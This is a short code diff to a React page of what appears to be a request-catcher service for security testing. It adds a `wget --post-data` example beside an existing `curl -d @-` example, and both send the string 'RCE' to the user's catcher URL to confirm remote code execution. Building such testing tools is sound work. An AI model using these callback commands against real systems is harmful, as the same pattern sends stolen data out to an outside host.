@@ -32,6 +32,9 @@ export class RequestsPage extends Component {
               <code>echo RCE | curl -d @- {this.props.user.url}</code>
               <br />
               <br />
+              <code>wget --post-data "$(echo RCE)" -O- {this.props.user.url}</code>
+              <br />
+              <br />
               <p>Check out the Response tab to edit your HTTP Response or the DNS tab to add DNS records for this subdomain.</p>
             </div>
           </div>
